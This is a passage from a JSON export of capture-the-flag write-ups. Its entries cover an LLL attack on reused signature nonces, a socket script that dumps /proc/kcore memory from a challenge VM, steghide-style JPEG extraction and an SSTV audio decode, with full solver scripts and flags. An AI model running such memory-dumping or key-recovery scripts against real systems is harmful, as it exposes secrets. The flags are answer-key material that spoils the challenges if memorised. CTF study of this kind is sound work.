        "content": "Setelah private key `x` ditemukan, AES key bisa dihitung persis seperti challenge:\n\n\n\nLalu ciphertext didekripsi menggunakan AES-CBC:\n\n\n\nPlaintext yang didapat:\n\n\n\n---",
        "code": "key = sha224(long_to_bytes(x)).digest()[:16]"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Read chall.py\n      │\n      ▼\nIdentify Schnorr-like signature:\ns = k - x e mod (p - 1)\n      │\n      ▼\nNotice nonce generation:\nk_i = bytes_to_long(pad(msg_i, 32)[::-1][:32] XOR otp)\n      │\n      ▼\nOTP reused across all signatures\n      │\n      ▼\nModel each k_i as linear expression over OTP bits\n      │\n      ▼\nUse signature equations:\nk_i - s_i ≡ x e_i mod (p - 1)\n      │\n      ▼\nEliminate x between equations\n      │\n      ▼\nSolve modular binary linear system using LLL\n      │\n      ▼\nRecover OTP bits\n      │\n      ▼\nRecover private key x\n      │\n      ▼\nVerify pow(g, x, p) == y\n      │\n      ▼\nDerive AES key:\nsha224(long_to_bytes(x))[:16]\n      │\n      ▼\nDecrypt ct with AES-CBC\n      │\n      ▼\nRAM{1_10V3_M47r1C35_P13453_D0N7_F1r3_M3}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.sage) is provided below:",
        "code": "#!/usr/bin/env sage -python\r\n\r\nfrom sage.all import *\r\nfrom hashlib import sha224\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Util.Padding import unpad\r\nfrom Crypto.Util.number import long_to_bytes\r\n\r\np = 148982911401264734500617017580518449923542719532318121475997727602675813514863\r\ng = 2\r\ny = 80755233471743924192344431776843570392154682022051277622078313458786622109745\r\n\r\nN = p - 1\r\n\r\nmessages = [\r\n    b\"CEO report for steelsecure.ai 2026\",\r\n    b\"gibson stocks. +3000%\",\r\n    b\"Junior dev stocks. -40%\",\r\n    b\"This time, our encryption scheme works 100%!\",\r\n    b\"Remember to fire junior dev 1 before next earning call\",\r\n    b\"Maybe even junior dev 2....\",\r\n]\r\n\r\nsigs = [\r\n    (\r\n        55186319803526665457621446837848338549443014439282945268028278919122026511922,\r\n        4347530123833677380082686544514469622180080120901130749580431124807,\r\n    ),\r\n    (\r\n        124893481061195646262318656782371890589877073947516713412897028511761199367107,\r\n        18642392171079017840151292310546946039643856158728294470775937409618,\r\n    ),\r\n    (\r\n        54849911895406225982686510866714495816624328443253959990195670305484612520764,\r\n        20673247939537846342100228355540602368162504090112024731773221007840,\r\n    ),\r\n    (\r\n        1681629804494672848290992724827020326513182040465498959024055969906663061524,\r\n        4498036740909481833747949352966032375341833202919691964444306144752,\r\n    ),\r\n    (\r\n        63893796764851236540467391829999130102972179614383027718574045769206495423694,\r\n        22304902881068152623813197201196452701769756345513122429710223002646,\r\n    ),\r\n    (\r\n        62831618333113248699390920668792703739905134831185369808782998618008681416845,\r\n        6157694344606896613712117058222901733796772525980298403133658746755,\r\n    ),\r\n]\r\n\r\nct = bytes.fromhex(\r\n    \"b38f2fff98dd083d5c3e6a3ef27c1e7dddc907fdaabcbb157ebd53fe26e44e9dd39fd749182db574be1ce6b2b2da20b5\"\r\n)\r\niv = bytes.fromhex(\"b1ebac6f48783e260c5a7c8768c86122\")\r\n\r\ns = [Integer(a) for a, b in sigs]\r\ne = [Integer(b) for a, b in sigs]\r\n\r\n\r\ndef pad32(m):\r\n    n = 32 - (len(m) % 32)\r\n    return m + bytes([n]) * n\r\n\r\n\r\ndef center_mod(a, mod):\r\n    a = Integer(a) % mod\r\n    if a > mod // 2:\r\n        a -= mod\r\n    return a\r\n\r\n\r\ndef coeff(mask, bit):\r\n    if ((mask >> bit) & 1) == 0:\r\n        return Integer(1) << bit\r\n    return -(Integer(1) << bit)\r\n\r\n\r\n# Known masks: pad(message, 32)[::-1][:32]\r\nP = [\r\n    Integer(int.from_bytes(pad32(m)[::-1][:32], \"big\"))\r\n    for m in messages\r\n]\r\n\r\n# k_i = P_i + sum(coeff(P_i, bit) * otp_bit[bit])\r\nlconst = []\r\nlcoef = []\r\n\r\nfor i in range(len(messages)):\r\n    lconst.append(P[i] - P[0])\r\n    lcoef.append([\r\n        coeff(P[i], bit) - coeff(P[0], bit)\r\n        for bit in range(256)\r\n    ])\r\n\r\nde = [e[i] - e[0] for i in range(len(messages))]\r\nds = [s[i] - s[0] for i in range(len(messages))]\r\n\r\n# Build modular linear equations by eliminating x.\r\nA = []\r\nB = []\r\n\r\nfor idx in range(2, len(messages)):\r\n    row = []\r\n    for bit in range(256):\r\n        val = de[idx] * lcoef[1][bit] - de[1] * lcoef[idx][bit]\r\n        row.append(center_mod(val, N))\r\n\r\n    const = de[idx] * lconst[1] - de[1] * lconst[idx]\r\n    rhs = de[idx] * ds[1] - de[1] * ds[idx]\r\n\r\n    A.append(row)\r\n    B.append(center_mod(rhs - const, N))\r\n\r\neq_count = len(A)\r\n\r\n# Remove bits that do not appear in the equations.\r\nactive_bits = [\r\n    bit for bit in range(256)\r\n    if any(A[r][bit] != 0 for r in range(eq_count))\r\n]\r\n\r\nm = len(active_bits)\r\ndim = m + eq_count + 1\r\n\r\nM = Matrix(ZZ, dim, dim)\r\n\r\n# Bit rows\r\nfor j, bit in enumerate(active_bits):\r\n    M[j, j] = 2\r\n    for r in range(eq_count):\r\n        M[j, m + r] = A[r][bit]\r\n\r\n# Modulus rows\r\nfor r in range(eq_count):\r\n    M[m + r, m + r] = N\r\n\r\n# Target / embedding row\r\nfor j in range(m):\r\n    M[m + eq_count, j] = 1\r\n\r\nfor r in range(eq_count):\r\n    M[m + eq_count, m + r] = B[r]\r\n\r\nM[m + eq_count, m + eq_count] = 1\r\n\r\nR = M.LLL()\r\n\r\notp_bits = None\r\n\r\nfor i in range(dim):\r\n    v = [Integer(R[i, j]) for j in range(dim)]\r\n\r\n    good_bits = all(abs(v[j]) == 1 for j in range(m))\r\n    good_mods = all(v[m + r] == 0 for r in range(eq_count))\r\n    good_last = abs(v[-1]) == 1\r\n\r\n    if good_bits and good_mods and good_last:\r\n        recovered = {}\r\n\r\n        if v[-1] == 1:\r\n            for j, bit in enumerate(active_bits):\r\n                recovered[bit] = int((1 - v[j]) // 2)\r\n        else:\r\n            for j, bit in enumerate(active_bits):\r\n                recovered[bit] = int((v[j] + 1) // 2)\r\n\r\n        otp_bits = recovered\r\n        break\r\n\r\nif otp_bits is None:\r\n    raise ValueError(\"OTP bits not found\")\r\n\r\n# Recover x from:\r\n# L_1 - S_1 = x * D_1 mod N\r\nL1 = lconst[1]\r\nfor bit in range(256):\r\n    L1 += lcoef[1][bit] * otp_bits.get(bit, 0)\r\n\r\nrhs = (L1 - ds[1]) % N\r\nD = de[1] % N\r\n\r\nd = gcd(D, N)\r\nassert rhs % d == 0\r\n\r\nmod = N // d\r\nx0 = (rhs // d) * inverse_mod(D // d, mod)\r\nx0 %= mod\r\n\r\ncandidates = [Integer(x0) + i * mod for i in range(int(d))]\r\n\r\nx = None\r\nfor cand in candidates:\r\n    if pow(g, int(cand), p) == y:\r\n        x = cand\r\n        break\r\n\r\nif x is None:\r\n    raise ValueError(\"private key not found\")\r\n\r\nprint(\"[+] recovered x =\", x)\r\n\r\nkey = sha224(long_to_bytes(int(x))).digest()[:16]\r\ncipher = AES.new(key, AES.MODE_CBC, iv)\r\npt = unpad(cipher.decrypt(ct), 16)\r\n\r\nprint(pt.decode())"
      }
    ],
    "terminalOutputs": [],
    "flag": "RAM{1_10V3_M47r1C35_P13453_D0N7_F1r3_M3}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-misc-amnesia",
    "title": "Amnesia",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "Service ini ternyata bukan “LLM” beneran. Setelah connect ke `nc 10.42.5.10 1337`, kita dikasih serial console ke VM kecil dan langsung login sebagai `root`.",
    "problemDescription": "Service ini ternyata bukan “LLM” beneran. Setelah connect ke `nc 10.42.5.10 1337`, kita dikasih serial console ke VM kecil dan langsung login sebagai `root`.\n\nArtefak paling penting di guest cuma `/chal`. Setelah binary itu saya ambil dan dibalik statically, `main()`-nya sangat pendek:\n\n1. buka `/flag`\n2. baca sampai `0x40` byte ke stack\n3. alokasikan heap nol\n4. loop 64 kali:\n   - `mmap()` satu page 4KB anonim\n   - `strncpy()` isi flag ke page itu\n5. `unlink(\"/flag\")`\n\nJadi isi flag tidak hilang begitu saja. Ia disalin ke banyak page memori lalu file aslinya dihapus.\n\nAwalnya saya cek jalur yang kelihatan paling obvious:\n\n- dump region initrd dari `boot_params`\n- cek `/proc/kcore`\n- cek sisa memori fisik\n\nTapi region initrd utama memang dipenuhi `0xCC` karena dibersihkan kernel setelah boot, jadi recovery langsung dari `ramdisk_image` tidak cukup.\n\nYang berhasil justru dump chunk tertentu dari `/proc/kcore`. Dengan membaca header ELF `kcore`, ada satu `LOAD` segment berukuran `0x2830000`. Dump chunk 4MB pada offset relatif `0x1800000` dari segment itu memperlihatkan flag muncul berulang kali pada boundary 4KB, konsisten dengan perilaku `/chal` yang membuat banyak copy page-aligned.\n\nRegex yang valid dari chunk itu adalah:\n\n`RMCTF{1_kn3w_1_f0rg07_50m37h1n6}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Langkah solve",
        "content": "Jalankan:\n\n\n\nScript akan:\n\n1. connect ke service\n2. tunggu shell guest\n3. baca header `/proc/kcore`\n4. cari `LOAD` segment target\n5. dump chunk 4MB pada offset relatif `0x1800000`\n6. regex flag dari chunk tersebut",
        "code": "python3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport binascii\r\nimport re\r\nimport socket\r\nimport struct\r\n\r\n\r\nHOST = \"10.42.5.10\"\r\nPORT = 1337\r\n\r\n# Segment containing the repeated flag pages, relative to the LOAD segment\r\n# whose file size is 0x2830000 in /proc/kcore.\r\nFLAG_CHUNK_REL = 0x1800000\r\nFLAG_CHUNK_LEN = 0x400000\r\n\r\n\r\ndef recv_until(sock: socket.socket, token: bytes, timeout: float) -> bytes:\r\n    sock.settimeout(1)\r\n    data = b\"\"\r\n    end = __import__(\"time\").time() + timeout\r\n    while __import__(\"time\").time() < end:\r\n        try:\r\n            chunk = sock.recv(65536)\r\n            if not chunk:\r\n                break\r\n            data += chunk\r\n            if token in data:\r\n                break\r\n        except socket.timeout:\r\n            continue\r\n    return data\r\n\r\n\r\ndef run_hex(sock: socket.socket, payload_cmd: str, timeout: float) -> bytes:\r\n    cmd = (\r\n        \"stty -echo; \"\r\n        \"printf '\\\\137\\\\137START\\\\137\\\\137\\\\n'; \"\r\n        f\"{payload_cmd}; \"\r\n        \"printf '\\\\137\\\\137END\\\\137\\\\137\\\\n'; \"\r\n        \"stty echo\\n\"\r\n    )\r\n    sock.sendall(cmd.encode())\r\n    raw = recv_until(sock, b\"__END__\", timeout).decode(\"utf-8\", \"replace\")\r\n\r\n    collecting = False\r\n    hex_lines = []\r\n    for line in raw.splitlines():\r\n        line = line.strip().replace(\"\\r\", \"\")\r\n        if line == \"__START__\":\r\n            collecting = True\r\n            continue\r\n        if line.startswith(\"__END__\"):\r\n            break\r\n        if collecting:\r\n            cleaned = \"\".join(ch for ch in line if ch in \"0123456789abcdef\")\r\n            if cleaned:\r\n                hex_lines.append(cleaned)\r\n\r\n    return binascii.unhexlify(\"\".join(hex_lines))\r\n\r\n\r\ndef main() -> None:\r\n    with socket.create_connection((HOST, PORT), timeout=5) as sock:\r\n        recv_until(sock, b\"~ #\", 25)\r\n\r\n        header = run_hex(\r\n            sock,\r\n            \"dd if=/proc/kcore bs=1 count=512 2>/dev/null | xxd -p\",\r\n            60,\r\n        )\r\n\r\n        phoff = struct.unpack_from(\"<Q\", header, 32)[0]\r\n        phentsz = struct.unpack_from(\"<H\", header, 54)[0]\r\n        phnum = struct.unpack_from(\"<H\", header, 56)[0]\r\n\r\n        seg_off = None\r\n        for i in range(phnum):\r\n            off = phoff + i * phentsz\r\n            p_type, _, p_offset, _, _, p_filesz, _, _ = struct.unpack_from(\r\n                \"<IIQQQQQQ\", header, off\r\n            )\r\n            if p_type == 1 and p_filesz == 0x2830000:\r\n                seg_off = p_offset\r\n                break\r\n\r\n        if seg_off is None:\r\n            raise RuntimeError(\"target LOAD segment not found\")\r\n\r\n        chunk = run_hex(\r\n            sock,\r\n            f\"xxd -p -s {seg_off + FLAG_CHUNK_REL} -l {FLAG_CHUNK_LEN} /proc/kcore\",\r\n            900,\r\n        )\r\n\r\n    candidates = sorted(set(re.findall(rb\"RMCTF\\{[^}]+\\}\", chunk)))\r\n    if not candidates:\r\n        raise RuntimeError(\"flag not found in extracted chunk\")\r\n\r\n    print(candidates[0].decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "RMCTF{1_kn3w_1_f0rg07_50m37h1n6}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-misc-brainfuzz",
    "title": "BrainFuzz",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "Writeup for challenge BrainFuzz",
    "problemDescription": "Challenge memberi dua artefak utama:\n\n- `generated_gibson.jpg`: gambar JPEG logo Gibson/RAMUNCHERS.\n- `output.bin`: blob kecil berukuran 2112 byte.\n\nFlag ditemukan dengan dua tahap:\n\n1. Decode `output.bin` untuk mendapatkan passphrase.\n2. Pakai passphrase tersebut untuk mengekstrak payload stego dari koefisien DCT JPEG.\n\nFlag akhir:\n\n```text\nRMCTF{m37h0d_b3h1nd_7h3_m4dn355!}\n```",
    "tools": [],
    "analysis": "Pengecekan awal pada JPEG tidak menunjukkan data yang ditempel setelah marker EOF, metadata menarik, atau string flag langsung. `output.bin` juga tidak berisi string ASCII yang jelas.\n\nHal yang menarik muncul saat `output.bin` dilihat per blok 8 byte. File ini memiliki panjang 2112 byte, sehingga pas menjadi:\n\n```text\n2112 / 8 = 264 blok\n264 bit = 33 byte\n```\n\nMayoritas blok berisi `ff ff ff ff ff ff ff ff`. Dengan aturan sederhana:\n\n- blok `ff ff ff ff ff ff ff ff` = bit `0`\n- blok selain itu = bit `1`\n\nlalu bit digabung per 8 bit secara MSB-first, hasilnya menjadi:\n\n```text\n\\xa0d3f1n173ly_n07_4_53cR37_p4$$w0Rd\n```\n\nByte pertama `0xa0` hanya padding/noise. String printable setelahnya adalah passphrase:\n\n```text\nd3f1n173ly_n07_4_53cR37_p4$$w0Rd\n```",
    "solution": [
      {
        "title": "2. Ekstraksi data dari JPEG",
        "content": "Passphrase tersebut tidak muncul sebagai string di JPEG, jadi tahap berikutnya adalah steganografi pada JPEG. Payload berada di koefisien DCT terkuantisasi, bukan di pixel RGB biasa.\n\nLangkah yang dipakai solver:\n\n1. Baca koefisien DCT JPEG dengan `libjpeg`.\n2. Ambil semua koefisien non-zero sebagai sample stego.\n3. Buat selector pseudo-random dari passphrase:\n   - hash passphrase dengan MD5;\n   - pecah digest menjadi empat word 32-bit little-endian;\n   - XOR keempat word itu untuk seed;\n   - gunakan LCG `state = 1367208549 * state + 1` modulo `2^32`;\n   - bentuk permutation selector seperti format steghide.\n4. Untuk JPEG, satu embedded bit dihitung dari 3 sample:\n\n\n\nHeader yang berhasil diekstrak:\n\n\n\nBagian encrypted payload berisi IV 16 byte di awal, lalu ciphertext. Untuk kompatibilitas mcrypt/steghide, `rijndael-128` berarti block size 128-bit, sedangkan key yang dipakai 32 byte. Jadi dekripsi dilakukan sebagai AES-256-CBC dengan key hasil keygen MD5 ala mcrypt:\n\n\n\nSetelah dekripsi, plain bitstring dipotong ke 505 bit. Plain tersebut masih memakai zlib compression. Setelah decompress, struktur payload berisi checksum, nama file, lalu data file.\n\nNama file embedded:\n\n\n\nIsi file:",
        "code": "bit = (abs(sample_1) % 2 + abs(sample_2) % 2 + abs(sample_3) % 2) % 2"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nSolve script for BrainFuzz.\r\n\r\nUsage:\r\n  python3 solve.py [output.bin] [generated_gibson.jpg]\r\n\r\nThe script decodes the passphrase from output.bin, extracts the steghide-style\r\npayload from the JPEG DCT coefficients, decrypts it, and prints the flag.\r\n\"\"\"\r\nfrom __future__ import annotations\r\n\r\nfrom array import array\r\nimport hashlib\r\nimport math\r\nimport os\r\nfrom pathlib import Path\r\nimport re\r\nimport struct\r\nimport subprocess\r\nimport sys\r\nimport textwrap\r\nimport zlib\r\n\r\n\r\nMAGIC = 0x73688D\r\nLCG_A = 1367208549\r\nLCG_C = 1\r\nSAMPLES_PER_VERTEX_JPEG = 3\r\n\r\n\r\ndef bits_to_int_le(bits: list[int]) -> int:\r\n    return sum((b & 1) << i for i, b in enumerate(bits))\r\n\r\n\r\ndef bytes_to_bits_le(data: bytes) -> list[int]:\r\n    out: list[int] = []\r\n    for byte in data:\r\n        for i in range(8):\r\n            out.append((byte >> i) & 1)\r\n    return out\r\n\r\n\r\ndef bits_to_bytes_le(bits: list[int]) -> bytes:\r\n    if len(bits) % 8:\r\n        bits = bits + [0] * (8 - (len(bits) % 8))\r\n    return bytes(bits_to_int_le(bits[i : i + 8]) for i in range(0, len(bits), 8))\r\n\r\n\r\ndef decode_passphrase(blob_path: Path) -> str:\r\n    data = blob_path.read_bytes()\r\n    if len(data) % 8 != 0:\r\n        raise ValueError(\"output.bin length is not divisible into 8-byte blocks\")\r\n\r\n    bits = []\r\n    for off in range(0, len(data), 8):\r\n        chunk = data[off : off + 8]\r\n        bits.append(0 if chunk == b\"\\xff\" * 8 else 1)\r\n\r\n    decoded = bits_to_bytes_msb(bits)\r\n    printable_runs = re.findall(rb\"[\\x20-\\x7e]{8,}\", decoded)\r\n    if not printable_runs:\r\n        raise ValueError(f\"no printable passphrase found in decoded blob: {decoded!r}\")\r\n    return max(printable_runs, key=len).decode(\"ascii\")\r\n\r\n\r\ndef bits_to_bytes_msb(bits: list[int]) -> bytes:\r\n    out = bytearray()\r\n    for i in range(0, len(bits), 8):\r\n        byte = 0\r\n        for bit in bits[i : i + 8]:\r\n            byte = (byte << 1) | (bit & 1)\r\n        out.append(byte)\r\n    return bytes(out)\r\n\r\n\r\nclass SteghideSelector:\r\n    \"\"\"The steghide 0.5.x selector permutation.\"\"\"\r\n\r\n    def __init__(self, maximum: int, passphrase: str):\r\n        self.maximum = maximum\r\n        self.num_in_array = 0\r\n        self.x: list[int] = []\r\n        self.y: list[int] = []\r\n        self.x_reversed: dict[int, int] = {}\r\n\r\n        digest = hashlib.md5(passphrase.encode()).digest()\r\n        seed = 0\r\n        for i in range(4):\r\n            # steghide stores hash bytes in a little-endian BitString.\r\n            seed ^= int.from_bytes(digest[i * 4 : (i + 1) * 4], \"little\")\r\n        self.prng_value = seed & 0xFFFFFFFF\r\n\r\n    def random_value(self, n: int) -> int:\r\n        self.prng_value = (LCG_A * self.prng_value + LCG_C) & 0xFFFFFFFF\r\n        return int(float(n) * (float(self.prng_value) / 4294967296.0))\r\n\r\n    def idx_x(self, value: int, limit: int) -> int | None:\r\n        idx = self.x_reversed.get(value)\r\n        if idx is not None and idx < limit:\r\n            return idx\r\n        return None\r\n\r\n    def set_x(self, idx: int, value: int) -> None:\r\n        self.x[idx] = value\r\n        self.x_reversed[value] = idx\r\n\r\n    def calculate(self, count: int) -> None:\r\n        j = self.num_in_array\r\n        if count > self.num_in_array:\r\n            self.x.extend([0] * (count - self.num_in_array))\r\n            self.y.extend([0] * (count - self.num_in_array))\r\n            self.num_in_array = count\r\n\r\n        while j < count:\r\n            k = j + self.random_value(self.maximum - j)\r\n            i = self.idx_x(k, j)\r\n            if i is not None:\r\n                self.set_x(j, self.y[i])\r\n                if self.x[j] > j:\r\n                    self.y[j] = j\r\n                if self.x[i] > j:\r\n                    self.y[i] = j\r\n                    l = self.idx_x(self.y[i], j)\r\n                    if l is not None:\r\n                        self.y[i] = self.y[l]\r\n            else:\r\n                self.set_x(j, k)\r\n                self.y[j] = j\r\n\r\n            if self.x[j] > j:\r\n                i = self.idx_x(self.y[j], j)\r\n                if i is not None:\r\n                    self.y[j] = self.y[i]\r\n            j += 1\r\n\r\n    def __getitem__(self, idx: int) -> int:\r\n        if idx >= self.num_in_array:\r\n            self.calculate(idx + 1)\r\n        return self.x[idx]\r\n\r\n\r\ndef dump_jpeg_coefficients(jpeg_path: Path, workdir: Path) -> Path:\r\n    helper_c = workdir / \".dump_coeffs_brainfuzz.c\"\r\n    helper_bin = workdir / \".dump_coeffs_brainfuzz\"\r\n    coeff_path = workdir / \".coeffs_brainfuzz_s16.bin\"\r\n\r\n    helper_c.write_text(\r\n        r'''\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <stdint.h>\r\n#include <jpeglib.h>\r\n\r\nint main(int argc, char **argv) {\r\n    if (argc != 3) return 2;\r\n    FILE *infile = fopen(argv[1], \"rb\");\r\n    if (!infile) return 3;\r\n    FILE *outfile = fopen(argv[2], \"wb\");\r\n    if (!outfile) return 4;\r\n\r\n    struct jpeg_decompress_struct cinfo;\r\n    struct jpeg_error_mgr jerr;\r\n    cinfo.err = jpeg_std_error(&jerr);\r\n    jpeg_create_decompress(&cinfo);\r\n    jpeg_stdio_src(&cinfo, infile);\r\n    jpeg_read_header(&cinfo, TRUE);\r\n    jvirt_barray_ptr *coeffs = jpeg_read_coefficients(&cinfo);\r\n\r\n    for (int ci = 0; ci < cinfo.num_components; ci++) {\r\n        jpeg_component_info *comp = cinfo.comp_info + ci;\r\n        for (JDIMENSION row = 0; row < comp->height_in_blocks; row++) {\r\n            JBLOCKARRAY blocks = (*cinfo.mem->access_virt_barray)\r\n                ((j_common_ptr)&cinfo, coeffs[ci], row, 1, FALSE);\r\n            for (JDIMENSION block = 0; block < comp->width_in_blocks; block++) {\r\n                for (int k = 0; k < DCTSIZE2; k++) {\r\n                    int16_t v = (int16_t)blocks[0][block][k];\r\n                    if (fwrite(&v, sizeof(v), 1, outfile) != 1) return 5;\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    jpeg_finish_decompress(&cinfo);\r\n    jpeg_destroy_decompress(&cinfo);\r\n    fclose(infile);\r\n    fclose(outfile);\r\n    return 0;\r\n}\r\n'''.lstrip()\r\n    )\r\n\r\n    subprocess.run(\r\n        [\"gcc\", str(helper_c), \"-o\", str(helper_bin), \"-ljpeg\"],\r\n        check=True,\r\n        stdout=subprocess.DEVNULL,\r\n        stderr=subprocess.DEVNULL,\r\n    )\r\n    subprocess.run(\r\n        [str(helper_bin), str(jpeg_path), str(coeff_path)],\r\n        check=True,\r\n        stdout=subprocess.DEVNULL,\r\n        stderr=subprocess.DEVNULL,\r\n    )\r\n    return coeff_path\r\n\r\n\r\ndef load_nonzero_dct_samples(coeff_path: Path) -> list[int]:\r\n    coeffs = array(\"h\")\r\n    coeffs.frombytes(coeff_path.read_bytes())\r\n    if sys.byteorder != \"little\":\r\n        coeffs.byteswap()\r\n    return [int(c) for c in coeffs if c != 0]\r\n\r\n\r\ndef extract_stego_bits(samples: list[int], passphrase: str, count: int, selector_state: dict) -> list[int]:\r\n    selector: SteghideSelector = selector_state[\"selector\"]\r\n    sample_idx: int = selector_state[\"sample_idx\"]\r\n    out: list[int] = []\r\n\r\n    for _ in range(count):\r\n        ev = 0\r\n        for _ in range(SAMPLES_PER_VERTEX_JPEG):\r\n            pos = selector[sample_idx]\r\n            ev = (ev + (abs(samples[pos]) & 1)) & 1\r\n            sample_idx += 1\r\n        out.append(ev)\r\n\r\n    selector_state[\"sample_idx\"] = sample_idx\r\n    return out\r\n\r\n\r\ndef mcrypt_md5_key(passphrase: str, key_size: int) -> bytes:\r\n    password = passphrase.encode()\r\n    key = b\"\"\r\n    while len(key) < key_size:\r\n        h = hashlib.md5()\r\n        h.update(password)\r\n        if key:\r\n            h.update(key)\r\n        key += h.digest()\r\n    return key[:key_size]\r\n\r\n\r\ndef aes_256_cbc_decrypt(ciphertext_with_iv: bytes, passphrase: str) -> bytes:\r\n    iv = ciphertext_with_iv[:16]\r\n    ciphertext = ciphertext_with_iv[16:]\r\n    key = mcrypt_md5_key(passphrase, 32)\r\n\r\n    try:\r\n        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\r\n\r\n        decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()\r\n        return decryptor.update(ciphertext) + decryptor.finalize()\r\n    except Exception:\r\n        # Fallback for lean CTF boxes that have openssl but not the Python package.\r\n        proc = subprocess.run(\r\n            [\r\n                \"openssl\",\r\n                \"enc\",\r\n                \"-aes-256-cbc\",\r\n                \"-d\",\r\n                \"-nopad\",\r\n                \"-K\",\r\n                key.hex(),\r\n                \"-iv\",\r\n                iv.hex(),\r\n            ],\r\n            input=ciphertext,\r\n            stdout=subprocess.PIPE,\r\n            stderr=subprocess.PIPE,\r\n            check=True,\r\n        )\r\n        return proc.stdout\r\n\r\n\r\ndef parse_embedded_plaintext(plaintext: bytes, nplain_bits: int) -> tuple[str, bytes]:\r\n    bits = bytes_to_bits_le(plaintext)[:nplain_bits]\r\n    pos = 0\r\n\r\n    compressed = bits[pos]\r\n    pos += 1\r\n    if compressed:\r\n        n_uncompressed_bits = bits_to_int_le(bits[pos : pos + 32])\r\n        pos += 32\r\n        compressed_bytes = bits_to_bytes_le(bits[pos:])\r\n        uncompressed = zlib.decompress(compressed_bytes)\r\n        bits = bytes_to_bits_le(uncompressed)[:n_uncompressed_bits]\r\n        pos = 0\r\n\r\n    has_checksum = bits[pos]\r\n    pos += 1\r\n    if has_checksum:\r\n        # steghide stores an mhash CRC32 here. It is not needed to recover the flag.\r\n        pos += 32\r\n\r\n    name_bytes = bytearray()\r\n    while True:\r\n        ch = bits_to_int_le(bits[pos : pos + 8])\r\n        pos += 8\r\n        if ch == 0:\r\n            break\r\n        name_bytes.append(ch)\r\n\r\n    data = bits_to_bytes_le(bits[pos:])\r\n    return name_bytes.decode(\"utf-8\", \"replace\"), data\r\n\r\n\r\ndef solve(blob_path: Path, jpeg_path: Path) -> str:\r\n    passphrase = decode_passphrase(blob_path)\r\n    coeff_path = dump_jpeg_coefficients(jpeg_path, blob_path.parent)\r\n    samples = load_nonzero_dct_samples(coeff_path)\r\n\r\n    state = {\"selector\": SteghideSelector(len(samples), passphrase), \"sample_idx\": 0}\r\n    header = extract_stego_bits(samples, passphrase, 65, state)\r\n\r\n    magic = bits_to_int_le(header[:24])\r\n    if magic != MAGIC:\r\n        raise ValueError(f\"bad stego magic: {magic:#x}\")\r\n    if header[24] != 0:\r\n        raise ValueError(\"unsupported stego version\")\r\n\r\n    algo = bits_to_int_le(header[25:30])\r\n    mode = bits_to_int_le(header[30:33])\r\n    nplain_bits = bits_to_int_le(header[33:65])\r\n\r\n    if (algo, mode) != (2, 1):\r\n        raise ValueError(f\"unexpected encryption info: algo={algo}, mode={mode}\")\r\n\r\n    encrypted_bits_len = 128 + math.ceil(nplain_bits / 128) * 128\r\n    encrypted_bits = extract_stego_bits(samples, passphrase, encrypted_bits_len, state)\r\n    encrypted = bits_to_bytes_le(encrypted_bits)\r\n    decrypted = aes_256_cbc_decrypt(encrypted, passphrase)\r\n    embedded_name, embedded_data = parse_embedded_plaintext(decrypted, nplain_bits)\r\n\r\n    match = re.search(rb\"[A-Z][A-Z0-9_]*\\{[^}\\r\\n]+\\}\", embedded_data)\r\n    if not match:\r\n        raise ValueError(f\"flag not found in embedded file {embedded_name!r}: {embedded_data!r}\")\r\n    return match.group(0).decode()\r\n\r\n\r\ndef main() -> None:\r\n    base = Path(__file__).resolve().parent\r\n    blob_path = Path(sys.argv[1]) if len(sys.argv) > 1 else base / \"output.bin\"\r\n    jpeg_path = Path(sys.argv[2]) if len(sys.argv) > 2 else base / \"generated_gibson.jpg\"\r\n    flag = solve(blob_path, jpeg_path)\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "RMCTF{m37h0d_b3h1nd_7h3_m4dn355!}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-misc-robotrambles",
    "title": "Robot rambles",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "File yang diberikan adalah `rambles.wav`, sebuah WAV PCM 16-bit mono 44.1 kHz dengan durasi sekitar 111 detik. Suaranya terdengar seperti sinyal radio/robot, jadi aku mulai dari mengecek bentuk frekuensinya.",
    "problemDescription": "File yang diberikan adalah `rambles.wav`, sebuah WAV PCM 16-bit mono 44.1 kHz dengan durasi sekitar 111 detik. Suaranya terdengar seperti sinyal radio/robot, jadi aku mulai dari mengecek bentuk frekuensinya.",
    "tools": [],
    "analysis": "Pertama, file dicek dengan `file` dan `ffprobe`:\n\n```bash\nfile rambles.wav\nffprobe -hide_banner rambles.wav\n```\n\nHasilnya menunjukkan audio normal, bukan arsip yang disamarkan. Saat dibuat spectrogram, sinyalnya berkutat di rentang sekitar 1200 Hz sampai 2300 Hz. Pola ini cocok dengan SSTV: 1200 Hz biasanya dipakai sebagai sync, sedangkan data gambar dikirim sebagai tone FM di sekitar 1500-2300 Hz.\n\nDi awal audio ada preamble VIS. Dengan membaca tone 30 ms setelah leader:\n\n- 1100 Hz berarti bit `1`\n- 1300 Hz berarti bit `0`\n- bit dikirim LSB-first\n\nBit VIS yang terbaca menghasilkan kode desimal `60`. Kode ini mengarah ke mode **Scottie 1**.",
    "solution": [
      {
        "title": "Decode",
